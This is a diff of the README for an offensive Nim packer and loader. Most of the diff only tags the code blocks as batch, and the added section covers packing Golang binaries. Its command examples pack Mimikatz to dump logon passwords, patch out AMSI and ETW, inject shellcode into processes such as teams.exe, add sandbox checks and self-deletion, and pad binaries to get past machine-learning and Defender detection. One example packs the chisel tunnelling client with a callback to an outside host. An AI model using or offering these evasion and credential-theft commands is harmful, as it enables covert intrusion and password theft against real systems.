@@ -157,7 +157,7 @@ Options:
 
 To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:
 
-```
+```batch
 NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
 ```
 
@@ -167,13 +167,13 @@ I found the reason for this behaviour. Don't ask me why but you cannot just take
 
 If you still want to embed the release version from github you can directly pass arguments like this:
 
-```
+```batch
 Packedmimikatz.exe coffee exit
 ```
 
 You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:
 
-```
+```batch
 NimSyscallLoader --file mimikatz.exe --peload --arguments "privilege::debug sekurlsa::logonpasswords exit"
 ``` 
 
@@ -181,65 +181,65 @@ Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loadin
 
 To pack Mimikatz for example and load it via syscall PE-Loader use the following:
 
-```
+```batch
 NimSyscallLoader --file=mimikatz.exe --peload
 ```
 
 To pack Shellcode for local injection:
 
-```
+```batch
 NimSyscallLoader --file=shellcode.bin --noAMSI
 ```
 
 To load shellcode into a remote process:
 
-```
+```batch
 NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
 ```
 
 To load a C# assembly:
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp
 ```
 To load a C# assembly with flags:
-```
+```batch
 NimSyscallLoader --file=Rubeus.exe --csharp --flags='hash /password:Aa1234'
 ```
 
 To load a C# assembly and use hellsgate for Syscall retrieval :
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
 ```
 
 To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:
 
-```
+```batch
 NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
 ```
 
 To add several thousand english words to bypass "Machine learning" detections:
 
-```
+```batch
 NimSyscallLoader --file=Seatbelt.exe --csharp --pump=words
 ```
 
 To use Syswhispers3 with/without jumper_randomized technique:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --syswhispers
 NimSyscallLoader --file=calc.bin --syswhispers --jump
 ```
 
 To encode shellcode with sgn before encrypting:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --sgn
 NimSyscallLoader --file=mimikatz.exe --peinject --sgn
 ```
 
 To spawn a custom process and inject into that afterwards + Patch AMSI/ETW in the remote process:
 
-```
+```batch
 NimSyscallLoader --file=calc.bin --remoteinject --customprocess rundll32.exe --remotepatchAMSI --remotePatchETW
 ```
 
@@ -260,6 +260,26 @@ amd64.windows.clang.linkerexe = "x86_64-w64-mingw32-clang"
 amd64.windows.clang.cpp.exe = "x86_64-w64-mingw32-clang++"
 amd64.windows.clang.cpp.linkerexe = "x86_64-w64-mingw32-clang++"
 ```
+
+### Handling Golang binaries with the Packer
+
+My custom `Nim-RUNPE` implementatation unfortunately cannot handle GoLang binaries at the moment. That's some strange bug within Nim, have to investigate deeper sometime. Definitely a rabbit whole, already spent a lot of time.
+
+For for the moment as workaround you can use `--peinject` to generate shellcode out of the golang binary to execute that either locally as executable or DLL.
+
+Example:
+
+```batch
+NimSyscallLoader --file chisel.exe --peinject --output ChiselPacked.exe
+
+or
+
+NimSyscallLoader --file chisel.exe --peinject --dll --arguments "client https://chisel-demo.herokuapp.com 3000" --output ChiselPacked.dll
+```
+
+You `have to` pass hardcoded arguments when using a DLL, because `PEInject` DLLs don't accept arguments from the target host. Remote injection is also possible but arguments cannot be hardcoded here.
+
+Defender detects Golang Packed binaries at the moment, pretty sure because of the very HIGH entropy (big payloads, so the binary contains 95% or more encrypted content). To avoid theese detections use either a DLL or `--pump` with any value.
 
 ### DLL-Sideloading
 
